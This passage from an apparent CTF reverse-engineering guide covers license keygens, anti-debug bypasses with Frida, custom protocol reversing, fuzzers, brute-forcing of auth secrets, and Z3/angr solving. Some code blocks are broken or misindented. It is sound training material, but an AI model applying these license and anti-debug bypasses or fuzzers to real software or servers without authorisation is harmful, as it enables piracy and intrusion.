hw human_id = get_hwid()
license_key = generate_hwid_license(username, hwid)

print(f"Username: {username}")
print(f"HWID: {hwid}")
print(f"License: {license_key}")
```

### Anti-Analysis Techniques in License Validation

**Detecting Debuggers:**

```c
// Common anti-debug techniques in validation code

// Pattern 1: ptrace detection (Linux)
#include <sys/ptrace.h>
bool is_debugged() {
    return ptrace(PTRACE_TRACEME, 0, 1, 0) < 0;
}

// Pattern 2: Timing checks
#include <time.h>
bool timing_check() {
    clock_t start = clock();
    // Validation logic
    clock_t end = clock();
    return (end - start) < 1000;  // Fail if too slow (debugger)
}

// Pattern 3: Self-integrity check
bool check_integrity() {
    // Check if code section has been modified
    extern char __executable_start;
    // Calculate checksum of .text section
    // Compare with embedded expected value
}
```

**Bypassing Anti-Debug:**

```python
# Using r2frida to bypass ptrace
import frida

script_code = """
Interceptor.attach(Module.findExportByName(null, "ptrace"), {
    onEnter: function(args) {
        // Always return success (not being traced)
        this.return_value = 0;
    },
    onLeave: function(retval) {
        retval.replace(0);
    }
});
"""

session = frida.attach("crackme")
script = session.create_script(script_code)
script.load()
```

## Custom Protocol Reverse Engineering

### Fundamentals

Custom network protocols in CTF challenges require understanding message formats, state machines, and authentication mechanisms. Common in network forensics and exploitation challenges.

**Protocol Analysis Workflow:**

1. Capture network traffic
2. Identify message structure
3. Determine state machine
4. Reverse engineer authentication
5. Implement client/server
6. Exploit vulnerabilities

### Traffic Capture and Initial Analysis

**Using tcpdump:**

```bash
# Capture traffic on specific port
tcpdump -i eth0 port 1337 -w capture.pcap

# Capture with ASCII output
tcpdump -i eth0 port 1337 -A

# Filter specific host
tcpdump -i eth0 host 192.168.1.100 -w targeted.pcap

# Read from file
tcpdump -r capture.pcap -X  # Hex + ASCII output
```

**Wireshark Analysis:**

```bash
# Command-line tool
tshark -r capture.pcap -Y "tcp.port == 1337" -T fields -e data

# Follow TCP stream
tshark -r capture.pcap -z follow,tcp,ascii,0

# Export objects
tshark -r capture.pcap --export-objects tcp,exported/

# Decrypt if possible (with keys)
tshark -r capture.pcap -o "ssl.keys_list:192.168.1.1,443,http,/path/to/key.pem"
```

**Scapy for Protocol Analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Read pcap
packets = rdpcap('capture.pcap')

# Analyze packet structure
for pkt in packets:
    if TCP in pkt and pkt[TCP].dport == 1337:
        payload = bytes(pkt[TCP].payload)
        print(f"Src: {pkt[IP].src}:{pkt[TCP].sport}")
        print(f"Dst: {pkt[IP].dst}:{pkt[TCP].dport}")
        print(f"Payload ({len(payload)} bytes): {payload.hex()}")
        print(f"ASCII: {payload}")
        print("-" * 60)

# Extract payloads
payloads = [bytes(pkt[TCP].payload) for pkt in packets 
            if TCP in pkt and pkt[TCP].dport == 1337]

# Look for patterns
for i, payload in enumerate(payloads):
    if payload.startswith(b'\x42\x42'):  # Magic bytes
        print(f"Packet {i}: Potential protocol message")
```

### Message Format Identification

**Common Protocol Structures:**

```python
# Structure 1: Length-prefixed messages
# [2 bytes length][N bytes data]
def parse_length_prefixed(data):
    length = int.from_bytes(data[:2], 'big')
    message = data[2:2+length]
    remaining = data[2+length:]
    return message, remaining

# Structure 2: Type-Length-Value (TLV)
# [1 byte type][2 bytes length][N bytes value]
def parse_tlv(data):
    msg_type = data[0]
    length = int.from_bytes(data[1:3], 'big')
    value = data[3:3+length]
    remaining = data[3+length:]
    return msg_type, value, remaining

# Structure 3: Fixed header + variable payload
# [4 bytes magic][1 byte type][1 byte flags][2 bytes length][N bytes data]
import struct

def parse_custom_protocol(data):
    if len(data) < 8:
        return None
    
    magic, msg_type, flags, length = struct.unpack('>I B B H', data[:8])
    
    if magic != 0x42424242:
        return None
    
    payload = data[8:8+length]
    return {
        'magic': magic,
        'type': msg_type,
        'flags': flags,
        'length': length,
        'payload': payload
    }
```

**Entropy Analysis:**

```python
import math
from collections import Counter

def calculate_entropy(data):
    """Calculate Shannon entropy to detect encryption/compression"""
    if not data:
        return 0
    
    entropy = 0
    counter = Counter(data)
    length = len(data)
    
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    
    return entropy

# Analyze protocol fields
for payload in payloads:
    entropy = calculate_entropy(payload)
    print(f"Entropy: {entropy:.2f} - ", end='')
    
    if entropy < 3:
        print("Likely plaintext/structured")
    elif entropy < 7:
        print("Possibly compressed or partially encrypted")
    else:
        print("Likely encrypted or random")
```

**Byte Frequency Analysis:**

```python
def analyze_byte_distribution(payloads):
    """Analyze byte frequency across all messages"""
    from collections import defaultdict
    import matplotlib.pyplot as plt
    
    frequency = defaultdict(int)
    
    for payload in payloads:
        for byte in payload:
            frequency[byte] += 1
    
    # Sort by frequency
    sorted_freq = sorted(frequency.items(), key=lambda x: x[1], reverse=True)
    
    print("Top 10 most common bytes:")
    for byte_val, count in sorted_freq[:10]:
        print(f"0x{byte_val:02x} ({chr(byte_val) if 32 <= byte_val < 127 else '?'}): {count}")
    
    # Plot distribution
    bytes_list = list(range(256))
    counts = [frequency[b] for b in bytes_list]
    
    plt.bar(bytes_list, counts)
    plt.xlabel('Byte Value')
    plt.ylabel('Frequency')
    plt.title('Byte Distribution in Protocol')
    plt.show()
```

### State Machine Reconstruction

**Manual State Tracking:**

```python
class ProtocolStateMachine:
    def __init__(self):
        self.state = 'INIT'
        self.transitions = {
            'INIT': {
                b'\x01': ('AUTH', self.handle_auth_request),
            },
            'AUTH': {
                b'\x02': ('AUTHENTICATED', self.handle_auth_response),
                b'\x03': ('INIT', self.handle_auth_fail),
            },
            'AUTHENTICATED': {
                b'\x10': ('DATA_TRANSFER', self.handle_data_request),
                b'\xFF': ('INIT', self.handle_logout),
            },
        }
    
    def process_message(self, msg_type, data):
        if self.state not in self.transitions:
            print(f"Unknown state: {self.state}")
            return
        
        if msg_type not in self.transitions[self.state]:
            print(f"Unexpected message type {msg_type.hex()} in state {self.state}")
            return
        
        new_state, handler = self.transitions[self.state][msg_type]
        print(f"{self.state} -> {new_state}")
        self.state = new_state
        return handler(data)
    
    def handle_auth_request(self, data):
        print(f"Auth request: {data}")
    
    def handle_auth_response(self, data):
        print(f"Auth successful: {data}")
    
    def handle_auth_fail(self, data):
        print(f"Auth failed: {data}")
    
    def handle_data_request(self, data):
        print(f"Data transfer: {data}")
    
    def handle_logout(self, data):
        print("Logout")

# Usage with captured traffic
fsm = ProtocolStateMachine()

for packet in packets:
    if TCP in packet and len(packet[TCP].payload) > 0:
        payload = bytes(packet[TCP].payload)
        msg_type = payload[0:1]
        data = payload[1:]
        fsm.process_message(msg_type, data)
```

**Automated State Discovery:**

```python
def discover_protocol_states(packets):
    """
    Discover protocol states from packet sequences
    Uses message types and response patterns
    """
    from collections import defaultdict
    
    # Track message type sequences
    sequences = []
    current_seq = []
    
    for pkt in packets:
        if TCP in pkt and len(pkt[TCP].payload) > 0:
            payload = bytes(pkt[TCP].payload)
            msg_type = payload[0]
            
            # Detect conversation boundaries (e.g., long gaps)
            if pkt.time - prev_time > 5:  # 5 second gap
                if current_seq:
                    sequences.append(current_seq)
                current_seq = []
            
            current_seq.append(msg_type)
            prev_time = pkt.time
    
    if current_seq:
        sequences.append(current_seq)
    
    # Find common patterns
    patterns = defaultdict(int)
    for seq in sequences:
        for i in range(len(seq) - 1):
            transition = (seq[i], seq[i+1])
            patterns[transition] += 1
    
    print("Common state transitions:")
    for transition, count in sorted(patterns.items(), key=lambda x: x[1], reverse=True): print(f"0x{transition[0]:02x} -> 0x{transition[1]:02x}: {count} times")

return patterns
````

### Authentication Reverse Engineering

**Challenge-Response Authentication:**
```python
#!/usr/bin/env python3
import hashlib
import struct

def reverse_challenge_response(pcap_file):
    """
    Extract and analyze challenge-response authentication
    """
    from scapy.all import rdpcap, TCP
    
    packets = rdpcap(pcap_file)
    auth_flows = []
    
    for i, pkt in enumerate(packets):
        if TCP in pkt and len(pkt[TCP].payload) > 0:
            payload = bytes(pkt[TCP].payload)
            
            # Identify authentication packets (adjust based on protocol)
            if payload[0] == 0x01:  # AUTH_CHALLENGE
                challenge = payload[1:17]  # 16-byte challenge
                
                # Find corresponding response
                for j in range(i+1, min(i+10, len(packets))):
                    resp_pkt = packets[j]
                    if TCP in resp_pkt and len(resp_pkt[TCP].payload) > 0:
                        resp_payload = bytes(resp_pkt[TCP].payload)
                        if resp_payload[0] == 0x02:  # AUTH_RESPONSE
                            response = resp_payload[1:33]  # 32-byte response
                            auth_flows.append((challenge, response))
                            break
    
    # Analyze auth flows to determine algorithm
    print(f"Found {len(auth_flows)} authentication flows\n")
    
    for i, (challenge, response) in enumerate(auth_flows):
        print(f"Flow {i+1}:")
        print(f"  Challenge: {challenge.hex()}")
        print(f"  Response:  {response.hex()}")
        
        # Test common algorithms
        # MD5(challenge)
        if hashlib.md5(challenge).digest() == response:
            print("  Algorithm: MD5(challenge)")
        
        # SHA256(challenge)
        elif hashlib.sha256(challenge).digest() == response:
            print("  Algorithm: SHA256(challenge)")
        
        # SHA256(challenge + secret)
        # [Inference] Need to brute force or find secret
        else:
            print("  Algorithm: Unknown (possibly includes secret)")
        
        print()
    
    return auth_flows

# Brute force secret key
def brute_force_auth_secret(challenge, response, wordlist):
    """Brute force secret key in challenge-response"""
    with open(wordlist, 'r') as f:
        for line in f:
            secret = line.strip().encode()
            
            # Test various combinations
            candidates = [
                hashlib.sha256(challenge + secret).digest(),
                hashlib.sha256(secret + challenge).digest(),
                hashlib.md5(challenge + secret).digest(),
                hashlib.md5(secret + challenge).digest(),
            ]
            
            for candidate in candidates:
                if candidate == response:
                    return secret.decode()
    
    return None
````

**Token-Based Authentication:**

```python
def analyze_token_auth(packets):
    """
    Analyze token-based authentication
    Look for JWT, session tokens, API keys
    """
    import base64
    import json
    
    tokens = []
    
    for pkt in packets:
        if TCP in pkt and len(pkt[TCP].payload) > 0:
            payload = bytes(pkt[TCP].payload)
            
            # Look for Base64-like strings
            try:
                payload_str = payload.decode('utf-8', errors='ignore')
                
                # JWT pattern (header.payload.signature)
                if payload_str.count('.') == 2:
                    parts = payload_str.split('.')
                    if len(parts[0]) > 10 and len(parts[1]) > 10:
                        try:
                            # Decode JWT header and payload
                            header = base64.urlsafe_b64decode(parts[0] + '==')
                            payload_data = base64.urlsafe_b64decode(parts[1] + '==')
                            
                            print("JWT Token found:")
                            print(f"  Header: {json.loads(header)}")
                            print(f"  Payload: {json.loads(payload_data)}")
                            print(f"  Signature: {parts[2]}")
                            
                            tokens.append({
                                'type': 'JWT',
                                'header': header,
                                'payload': payload_data,
                                'signature': parts[2]
                            })
                        except:
                            pass
                
                # Session token pattern (hex string)
                elif len(payload_str) in [32, 64, 128] and all(c in '0123456789abcdef' for c in payload_str.lower()):
                    print(f"Session token found: {payload_str}")
                    tokens.append({
                        'type': 'SESSION',
                        'token': payload_str
                    })
            
            except:
                pass
    
    return tokens
```

### Custom Protocol Implementation

**Client Implementation Template:**

```python
#!/usr/bin/env python3
import socket
import struct

class CustomProtocolClient:
    """
    Client for custom CTF protocol
    Based on reverse engineered specification
    """
    
    MAGIC = 0x42424242
    
    # Message types
    MSG_HELLO = 0x01
    MSG_AUTH = 0x02
    MSG_DATA = 0x10
    MSG_COMMAND = 0x20
    MSG_RESPONSE = 0xFF
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.authenticated = False
    
    def connect(self):
        """Establish connection"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        print(f"Connected to {self.host}:{self.port}")
    
    def send_message(self, msg_type, payload=b''):
        """
        Send protocol message
        Format: [4 bytes magic][1 byte type][2 bytes length][payload]
        """
        length = len(payload)
        header = struct.pack('>I B H', self.MAGIC, msg_type, length)
        message = header + payload
        
        self.sock.sendall(message)
        print(f"Sent: type=0x{msg_type:02x}, len={length}")
    
    def recv_message(self):
        """Receive and parse protocol message"""
        # Receive header (7 bytes)
        header = self._recv_exactly(7)
        if not header:
            return None
        
        magic, msg_type, length = struct.unpack('>I B H', header)
        
        if magic != self.MAGIC:
            raise ValueError(f"Invalid magic: 0x{magic:08x}")
        
        # Receive payload
        payload = self._recv_exactly(length) if length > 0 else b''
        
        print(f"Received: type=0x{msg_type:02x}, len={length}")
        return msg_type, payload
    
    def _recv_exactly(self, n):
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data
    
    def handshake(self):
        """Perform initial handshake"""
        self.send_message(self.MSG_HELLO, b'CLIENT_v1.0')
        msg_type, payload = self.recv_message()
        
        if msg_type == self.MSG_RESPONSE:
            print(f"Handshake successful: {payload.decode()}")
            return True
        return False
    
    def authenticate(self, username, password):
        """Authenticate with server"""
        import hashlib
        
        # Send auth request
        self.send_message(self.MSG_AUTH, username.encode())
        
        # Receive challenge
        msg_type, challenge = self.recv_message()
        if msg_type != self.MSG_AUTH:
            return False
        
        print(f"Received challenge: {challenge.hex()}")
        
        # Compute response based on reverse engineered algorithm
        # Example: SHA256(challenge + password)
        response = hashlib.sha256(challenge + password.encode()).digest()
        
        # Send response
        self.send_message(self.MSG_AUTH, response)
        
        # Check result
        msg_type, result = self.recv_message()
        if msg_type == self.MSG_RESPONSE and result == b'OK':
            self.authenticated = True
            print("Authentication successful")
            return True
        
        print("Authentication failed")
        return False
    
    def send_command(self, command):
        """Send command to server"""
        if not self.authenticated:
            raise RuntimeError("Not authenticated")
        
        self.send_message(self.MSG_COMMAND, command.encode())
        msg_type, response = self.recv_message()
        
        return response.decode()
    
    def close(self):
        """Close connection"""
        if self.sock:
            self.sock.close()
            print("Connection closed")

# Usage
if __name__ == "__main__":
    client = CustomProtocolClient('challenge.ctf', 1337)
    
    try:
        client.connect()
        client.handshake()
        client.authenticate('admin', 'secret123')
        
        # Send exploitation command
        flag = client.send_command('GET_FLAG')
        print(f"Flag: {flag}")
        
    finally:
        client.close()
```

**Server Implementation for Testing:**

```python
#!/usr/bin/env python3
import socket
import struct
import hashlib
import threading

class CustomProtocolServer:
    """
    Server implementation for protocol testing
    Mimics behavior of CTF challenge server
    """
    
    MAGIC = 0x42424242
    MSG_HELLO = 0x01
    MSG_AUTH = 0x02
    MSG_COMMAND = 0x20
    MSG_RESPONSE = 0xFF
    
    def __init__(self, host='0.0.0.0', port=1337):
        self.host = host
        self.port = port
        self.server_socket = None
        
        # Server state
        self.secret_key = b'CTF_SECRET_KEY'
        self.flag = 'CTF{pr0t0c0l_r3v3rs3d}'
    
    def start(self):
        """Start server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        
        print(f"Server listening on {self.host}:{self.port}")
        
        while True:
            client_sock, addr = self.server_socket.accept()
            print(f"Client connected: {addr}")
            
            # Handle client in thread
            thread = threading.Thread(target=self.handle_client, args=(client_sock,))
            thread.start()
    
    def handle_client(self, sock):
        """Handle individual client connection"""
        authenticated = False
        
        try:
            while True:
                # Receive message
                header = self._recv_exactly(sock, 7)
                if not header:
                    break
                
                magic, msg_type, length = struct.unpack('>I B H', header)
                payload = self._recv_exactly(sock, length) if length > 0 else b''
                
                # Process message
                if msg_type == self.MSG_HELLO:
                    response = b'SERVER_v1.0'
                    self._send_message(sock, self.MSG_RESPONSE, response)
                
                elif msg_type == self.MSG_AUTH:
                    if not authenticated:
                        # Generate challenge
                        import os
                        challenge = os.urandom(16)
                        self._send_message(sock, self.MSG_AUTH, challenge)
                        
                        # Receive response
                        header = self._recv_exactly(sock, 7)
                        _, msg_type, length = struct.unpack('>I B H', header)
                        response = self._recv_exactly(sock, length)
                        
                        # Verify response
                        expected = hashlib.sha256(challenge + self.secret_key).digest()
                        if response == expected:
                            authenticated = True
                            self._send_message(sock, self.MSG_RESPONSE, b'OK')
                        else:
                            self._send_message(sock, self.MSG_RESPONSE, b'FAIL')
                
                elif msg_type == self.MSG_COMMAND:
                    if not authenticated:
                        self._send_message(sock, self.MSG_RESPONSE, b'NOT_AUTHENTICATED')
                    else:
                        command = payload.decode()
                        if command == 'GET_FLAG':
                            self._send_message(sock, self.MSG_RESPONSE, self.flag.encode())
                        else:
                            self._send_message(sock, self.MSG_RESPONSE, b'UNKNOWN_COMMAND')
        
        except Exception as e:
            print(f"Error handling client: {e}")
        
        finally:
            sock.close()
    
    def _send_message(self, sock, msg_type, payload):
        """Send protocol message"""
        length = len(payload)
        header = struct.pack('>I B H', self.MAGIC, msg_type, length)
        sock.sendall(header + payload)
    
    def _recv_exactly(self, sock, n):
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

# Run server
if __name__ == "__main__":
    server = CustomProtocolServer()
    server.start()
```

### Fuzzing Custom Protocols

**Protocol Fuzzer:**

```python
#!/usr/bin/env python3
import socket
import struct
import random

class ProtocolFuzzer:
    """Fuzz custom protocol to find vulnerabilities"""
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def fuzz_message_types(self):
        """Fuzz different message types"""
        for msg_type in range(256):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.host, self.port))
                
                # Send fuzzed message
                payload = b'A' * 100
                header = struct.pack('>I B H', 0x42424242, msg_type, len(payload))
                sock.sendall(header + payload)
                
                # Check response
                try:
                    response = sock.recv(1024)
                    print(f"Type 0x{msg_type:02x}: Response received ({len(response)} bytes)")
                except socket.timeout:
                    print(f"Type 0x{msg_type:02x}: Timeout")
                
                sock.close()
            
            except Exception as e:
                print(f"Type 0x{msg_type:02x}: Error - {e}")
    
    def fuzz_lengths(self):
        """Fuzz with various payload lengths"""
        interesting_lengths = [
            0, 1, 2, 15, 16, 17,  # Boundary values
            255, 256, 257,  # Byte boundary
            65535, 65536,  # Max uint16
            -1, -2, -256,  # Negative (unsigned wrap)
        ]
        
        for length in interesting_lengths:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.host, self.port))
                
                # Send message with claimed length != actual length
                actual_payload = b'X' * 100
                header = struct.pack('>I B H', 0x42424242, 0x01, length & 0xFFFF)
                sock.sendall(header + actual_payload)
                
                response = sock.recv(1024)
                print(f"Length {length}: OK")
                sock.close()
            
            except Exception as e:
                print(f"Length {length}: {type(e).__name__}")
    
    def fuzz_field_values(self):
        """Fuzz specific protocol fields"""
        magic_values = [
            0x00000000,
            0x42424242,  # Correct magic
            0xFFFFFFFF,
            0x41414141,
            0xDEADBEEF,
        ]
        
        for magic in magic_values:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.host, self.port))
                
                header = struct.pack('>I B H', magic, 0x01, 10)
                payload = b'A' * 10
                sock.sendall(header + payload)
                
                response = sock.recv(1024)
                print(f"Magic 0x{magic:08x}: Accepted")
                sock.close()
            
            except Exception as e:
                print(f"Magic 0x{magic:08x}: Rejected ({e})")

# Usage
fuzzer = ProtocolFuzzer('challenge.ctf', 1337)
fuzzer.fuzz_message_types()
fuzzer.fuzz_lengths()
fuzzer.fuzz_field_values()
```

**Boofuzz Integration:**

```python
#!/usr/bin/env python3
from boofuzz import *

def main():
    """
    Use boofuzz framework for comprehensive protocol fuzzing
    """
    session = Session(
        target=Target(
            connection=SocketConnection("challenge.ctf", 1337, proto='tcp')
        ),
    )
    
    # Define protocol structure
    s_initialize("custom_protocol")
    
    # Magic (4 bytes, shouldn't be fuzzed)
    s_static(struct.pack('>I', 0x42424242))
    
    # Message type (1 byte, fuzz this)
    s_byte(0x01, name="msg_type", fuzzable=True)
    
    # Length field (2 bytes)
    s_size("payload", length=2, endian=">", name="length", fuzzable=True)
    
    # Payload
    if s_block_start("payload"):
        s_string("FUZZ", name="payload_data")
    s_block_end()
    
    # Connect to session
    session.connect(s_get("custom_protocol"))
    
    # Fuzz
    session.fuzz()

if __name__ == "__main__":
    main()
```

## Constraint Solving in Binary Challenges

### Fundamentals

Constraint solving transforms reversing problems into mathematical satisfaction problems. Essential for complex key validation, maze solving, and symbolic execution scenarios.

**Problem Types:**

- Path constraints (finding input reaching specific code)
- Mathematical relationships (equations system)
- Cryptographic puzzles (hash preimages, key recovery)
- Logic puzzles embedded in binaries

### Z3 Theorem Prover

**Basic Z3 Usage:**

```python
#!/usr/bin/env python3
from z3 import *

# Example: Simple constraint solving
def solve_simple():
    """Solve: x + y == 10, x - y == 4"""
    x = Int('x')
    y = Int('y')
    
    solver = Solver()
    solver.add(x + y == 10)
    solver.add(x - y == 4)
    
    if solver.check() == sat:
        model = solver.model()
        print(f"x = {model[x]}")
        print(f"y = {model[y]}")
    else:
        print("No solution")

solve_simple()
# Output: x = 7, y = 3
```

**Bit-Vector Constraints:**

```python
from z3 import *

def solve_bitvector_constraints():
    """
    Solve constraints on fixed-width integers
    Common in binary reversing
    """
    # 32-bit variables
    x = BitVec('x', 32)
    y = BitVec('y', 32)
    
    solver = Solver()
    
    # Constraints from disassembly
    solver.add(x ^ 0x12345678 == 0xDEADBEEF)
    solver.add((x << 3) + y == 0x1000)
    solver.add(x & 0xFF == 0x42)
    
    if solver.check() == sat:
        model = solver.model()
        print(f"x = 0x{model[x].as_long():08x}")
        print(f"y = 0x{model[y].as_long():08x}")

solve_bitvector_constraints()
```

**Complex Validation Logic:**

```python
#!/usr/bin/env python3
from z3 import *

def solve_serial_validation():
    """
    Reverse complex serial validation
    Based on actual CTF challenge pattern
    """
    
    # Serial is 16 bytes
    serial = [BitVec(f's_{i}', 8) for i in range(16)]
    
    solver = Solver()
    
    # Constraint 1: Printable ASCII
    for byte in serial:
        solver.add(And(byte >= 0x20, byte <= 0x7e))
    
    # Constraint 2: Format XXXX-XXXX-XXXX-XXXX
    solver.add(serial[4] == ord('-'))
    solver.add(serial[9] == ord('-'))
    solver.add(serial[14] == ord('-'))
    
    # Constraint 3: Checksum of parts
    part1_sum = Sum([ZeroExt(24, serial[i]) for i in range(4)])
    part2_sum = Sum([ZeroExt(24, serial[i]) for i in range(5, 9)])
    part3_sum = Sum([ZeroExt(24, serial[i]) for i in range(10, 14)])
    
    solver.add(part1_sum == 0x190)
    solver.add(part2_sum == part1_sum + 0x10)
    solver.add(part3_sum == part2_sum - 0x05)
    
    # Constraint 4: XOR relationship
    solver.add(serial[0] ^ serial[5] ^ serial[10] ^ serial[15] == 0x5A)
    
    # Constraint 5: Product constraint
    solver.add(ZeroExt(8, serial[1]) * ZeroExt(8, serial[6]) == 0x0BB8)
    
    # Constraint 6: Polynomial relationship
    # serial[2]^2 + serial[7] == 0x1234
    solver.add(ZeroExt(16, serial[2]) * ZeroExt(16, serial[2]) + ZeroExt(16, serial[7]) == 0x1234)
    
    print("Solving constraints...")
    if solver.check() == sat:
        model = solver.model()
        solution = ''.join(chr(model[byte].as_long()) for byte in serial)
        print(f"Valid serial: {solution}")
        return solution
    else:
        print("No solution found (constraints may be unsatisfiable)")
        return None

solve_serial_validation()
```

### Symbolic Execution with angr

**Basic Path Exploration:**

```python
#!/usr/bin/env python3
import angr
import claripy

def solve_with_angr(binary_path, find_addr, avoid_addrs=[]):
    """
    Generic angr solver for finding input that reaches target address
    """
    project = angr.Project(binary_path, auto_load_libs=False)
    
    # Create symbolic input
    flag = claripy.BVS('flag', 50 * 8)  # 50 bytes
    
    # Initial state
    state = project.factory.entry_state(
        args=[binary_path],
        stdin=flag
    )
    
    # Constrain to printable ASCII
    for byte in flag.chop(8):
        state.solver.add(byte >= 0x20)
        state.solver.add(byte <= 0x7e)
    
    # Create simulation manager
    simgr = project.factory.simulation_manager(state)
    
    # Explore
    print("Exploring paths...")
    simgr.explore(find=find_addr, avoid=avoid_addrs)
    
    if simgr.found:
        found_state = simgr.found[0]
        solution = found_state.solver.eval(flag, cast_to=bytes)
        print(f"Solution: {solution}")
        return solution
    else:
        print("No solution found")
        return None

# Usage
solution = solve_with_angr(
    './challenge',
    find_addr=0x400890,  # Address of "Correct!" message
    avoid_addrs=[0x4008a0, 0x4008b0]  # Addresses of "Wrong!" messages
)
```

**Custom Hooks and Simplifications:**

```python
import angr

def solve_with_hooks(binary_path):
    """
    Use hooks to simplify complex functions during symbolic execution
    """
    project = angr.Project(binary_path, auto_load_libs=False)
    
    # Hook expensive function to return constant
    @project.hook(0x400700, length=5)
    def hook_expensive_function(state):
        """Replace expensive crypto check with simplified version"""
        # Original: complex RSA verification
        # Simplified: always return success
        state.regs.rax = 1
    
    # Hook anti-debugging check
    @project.hook(0x400800)
    def hook_ptrace(state):
        """Bypass ptrace anti-debug"""
        state.regs.rax = 0  # Pretend not being traced
    
    # Setup and solve
    flag = claripy.BVS('flag', 32 * 8)
    state = project.factory.entry_state(stdin=flag)
    
    simgr = project.factory.simulation_manager(state)
    simgr.explore(find=0x400a00)
    
    if simgr.found:
        return simgr.found[0].solver.eval(flag, cast_to=bytes)
    return None
```

**Solving Maze Challenges:**

```python
#!/usr/bin/env python3
import angr
import claripy

def solve_maze(binary_path):
    """
    Solve binary maze challenge
    Input: sequence of moves (WASD)
    Goal: reach end position
    """
    project = angr.Project(binary_path, auto_load_libs=False)
    
    # Symbolic moves (max 100 moves)
    moves = claripy.BVS('moves', 100 * 8)
    
    state = project.factory.entry_state(stdin=moves)
    
    # Constrain to valid move characters
    for byte in moves.chop(8):
        state.solver.add(Or(
            byte == ord('W'),
            byte == ord('A'),
            byte == ord('S'),
            byte == ord('D'),
            byte == ord('\n')  # Terminator
        ))
    
    # Find winning condition
    simgr = project.factory.simulation_manager(state)
    
    # Success: prints "You won!"
    success_addr = 0x401234
    
    # Failure: prints "Hit wall!" or "Out of bounds!"
    avoid_addrs = [0x401250, 0x401260]
    
    simgr.explore(find=success_addr, avoid=avoid_addrs)
    
    if simgr.found:
        solution = simgr.found[0].solver.eval(moves, cast_to=bytes)
        # Extract moves until newline
        solution_str = solution.split(b'\n')[0].decode()
        print(f"Solution path: {solution_str}")
        return solution_str
    
    return None
```

### SMT Solving Patterns

**Array Constraints:**

```python
from z3 import *

def solve_array_constraints():
    """
    Solve constraints involving arrays
    Example: Sudoku-like puzzle in binary
    """
    # 9x9 array
    grid = [[Int(f"cell_{i}_{j}") for j in range(9)] for i in range(9)]
    
    solver = Solver()
    
    # Constraint: Each cell is 1-9
    for i in range(9):
        for j in range(9):
            solver.add(And(grid[i][j] >= 1, grid[i][j] <= 9))
    
    # Constraint: Each row has unique values
    for i in range(9):
        solver.add(Distinct(grid[i]))
    
    # Constraint: Each column has unique values
    for j in range(9):
        solver.add(Distinct([grid[i][j] for i in range(9)]))
    
    # Constraint: Each 3x3 box has unique values
    for box_i in range(3):
        for box_j in range(3):
            cells = [grid[i][j] 
                    for i in range(box_i*3, box_i*3+3)
                    for j in range(box_j*3, box_j*3+3)]
            solver.add(Distinct(cells))
    
    # Add known values (from binary)
    solver.add(grid[0][0] == 5)
    solver.add(grid[0][1] == 3)
    # ... more constraints
    
    if solver.check() == sat:
        model = solver.model()
        print("Solution:")
        for i in range(9):
            row = [model[grid[i][j]].as_long() for j in range(9)]
            print(' '.join(str(x) for x in row))
```

**String Constraints:**

```python
from z3 import *

def solve_string_constraints():
    """
    Solve constraints on strings
    Z3 has limited string theory support
    """
    # String variables
    s1 = String('s1')
    s2 = String('s2')
    
    solver = Solver()
    
    # Constraints
    solver.add(Length(s1) == 10)
    solver.add(PrefixOf(StringVal("CTF{"), s1))
    solver.add(SuffixOf(StringVal("}"), s1))
    solver.add(Contains(s1, StringVal("key")))
    
    if solver.check() == sat:
        model = solver.model()
        print(f"s1 = {model[s1]}")
```

### Hybrid Approaches

**Concolic Execution:**

```python
#!/usr/bin/env python3
"""
Combine concrete and symbolic execution
Run program with real inputs, track constraints, generate new inputs
"""

def concolic_solve(binary_path, initial_input):
    """
    Concolic (concrete + symbolic) execution
    """
    import angr
    
    project = angr.Project(binary_path)
    
    # Start with concrete input
    state = project.factory.entry_state(
        args=[binary_path],
        stdin=angr.SimFile('/dev/stdin', content=initial_input)
    )
    
    # Enable state merging for better performance
    state.options.add(angr.options.LAZY_SOLVES)
simgr = project.factory.simulation_manager(state)

# Execute with concrete values but track constraints
simgr.use_technique(angr.exploration_techniques.DFS())

# Explore multiple paths
for _ in range(100):
    simgr.step()
    
    # Check each active state
    for active_state in simgr.active:
        # If we hit interesting condition, generate new input
        if active_state.addr == 0x400890:
            new_input = active_state.solver.eval(
                active_state.posix.stdin.content[0][0],
                cast_to=bytes
            )
            print(f"Generated input: {new_input}")
    
    if simgr.found:
        break

return simgr

# Usage

solution = concolic_solve('./challenge', b'AAAA\n')

````

**Taint Analysis for Constraint Discovery:**
```python
#!/usr/bin/env python3
import angr

def taint_analysis(binary_path):
    """
    Perform taint analysis to find which input bytes affect output
    """
    project = angr.Project(binary_path, auto_load_libs=False)
    
    # Create symbolic input with named bytes
    input_bytes = [claripy.BVS(f'input_{i}', 8) for i in range(32)]
    input_data = claripy.Concat(*input_bytes)
    
    state = project.factory.entry_state(stdin=input_data)
    
    # Track taint propagation
    simgr = project.factory.simulation_manager(state)
    simgr.run(until=lambda sm: len(sm.active) == 0)
    
    # Analyze which inputs affect critical comparisons
    for deadended in simgr.deadended:
        # Check constraints on each input byte
        for i, byte in enumerate(input_bytes):
            constraints = deadended.solver.constraints
            
            # Check if this byte appears in constraints
            if any(byte in c.variables for c in constraints):
                print(f"Input byte {i} affects execution path")
                
                # Try to solve for this byte
                if deadended.solver.satisfiable():
                    value = deadended.solver.eval(byte)
                    print(f"  Suggested value: 0x{value:02x} ('{chr(value) if 32 <= value < 127 else '?'}')")
````

### Advanced Constraint Solving Techniques

